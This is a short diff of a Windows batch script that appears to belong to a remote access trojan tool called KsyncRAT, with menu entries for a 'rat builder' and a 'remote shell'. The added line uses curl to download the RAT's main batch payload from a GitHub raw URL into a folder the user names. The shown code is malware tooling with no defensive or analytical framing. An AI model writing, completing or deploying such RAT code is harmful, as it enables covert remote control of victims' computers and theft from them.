@@ -34,7 +34,7 @@ echo 12) rat builder
 goto :prompt
 :builder
 set /p path="path to folder: "
-curl -s --output %path%\KsyncRAT.bat
+curl -s https://raw.githubusercontent.com/randomguyontiktoklivenumber2-crypto/KsyncRAT/refs/heads/main/main.bat --output %path%\KsyncRAT.bat
 goto prompt
 :shell
 echo remote shell type "exit" to go back to the RAT
